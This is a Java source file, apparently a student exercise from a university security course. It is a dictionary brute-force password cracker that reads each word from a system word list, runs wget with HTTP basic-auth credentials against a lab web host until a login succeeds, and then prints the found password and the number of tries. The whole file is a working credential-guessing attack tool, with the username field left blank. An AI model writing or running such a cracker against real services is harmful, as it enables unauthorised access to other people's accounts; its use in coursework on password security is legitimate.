

import java.io.*;
import java.*;
import java.util.StringTokenizer;

public class Dictionary
{
   public static void main(String args[])
   {
      final String DICT_FILE = "/usr/share/lib/dict/words"; 
      String basic_url = "http://sec-crack.cs.rmit.edu./SEC/2/";  
      String password;
      String s = null;
      int num_tries = 0;
      
      try
      {
         
         BufferedReader dict_word = new BufferedReader
                                  (new FileReader (DICT_FILE));
  
         
         while((password = dict_word.readLine())!= null)
         {        
            try 
            {
               
               Process p = Runtime.getRuntime().exec("wget --http-user= --http-passwd=" + password + " " + basic_url);
              
               BufferedReader stdInput = new BufferedReader(new 
                     InputStreamReader(p.getInputStream()));

               BufferedReader stdError = new BufferedReader(new 
                     InputStreamReader(p.getErrorStream()));

               
               while ((s = stdInput.readLine()) != null)
               {
                  System.out.println(s);
               }
                  
               
               while ((s = stdError.readLine()) != null)
               {
                  System.out.println(s);
               }

               try
	       {
                  p.waitFor(); 
               }
               catch (InterruptedException g)  
               {
               }  

               num_tries++;
                  
               if((p.exitValue()) == 0) 
               {       
                  System.out.println("**********PASSWORD IS: " + password);
	          System.out.println("**********NUMBER OF TRIES: " + num_tries);
                  System.exit(1);
               }
            }
            catch (IOException e)
            {
               System.out.println("exception happened - here's what I know: ");
               e.printStackTrace();
               System.exit(-1);
            }
         }
         
         System.out.println("DICTIONARY BRUTE FORCE UNABLE  FIND PASSWORD");
         System.out.println("**********Sorry, password was not found in dictionary file");
         System.exit(1);

      }
      catch (FileNotFoundException exception)
      {
         System.out.println(exception);
      }
      catch (IOException exception)
      {
         System.out.println(exception);
      }
   }
}
  
